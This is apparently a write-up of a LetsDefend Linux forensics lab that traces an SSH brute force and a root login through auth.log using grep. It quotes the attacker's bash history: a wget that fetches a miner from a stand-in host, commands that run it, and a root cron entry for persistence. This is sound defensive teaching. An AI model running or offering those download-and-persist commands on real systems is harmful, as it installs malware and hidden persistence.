---
title: "LetsDefend: Linux Forensics"
tags: [letsdefend, blue-team, linux, syslog, auth-log]

description: "Parsing /var/log/auth.log to track an SSH brute force and persistence."
---

# LetsDefend: Linux Forensics

**Scenario**: SSH breach.
**Log**: `auth.log`.

## 1. Brute Force Detection
We use `grep` to count failures.
`grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c`
IP `192.168.1.5` failed 500 times.

## 2. Success
`grep "Accepted password" auth.log`
We see `192.168.1.5` eventually succeeded as `root`.

## 3. Actions Profiling (history)
We check `.bash_history`.
`wget http://malware.com/miner`
`chmod +x miner`
`./miner`
`echo "* * * * * /root/miner" >> /var/spool/cron/crontabs/root`

## Conclusion
Classic weak password -> Persistence via Cron.
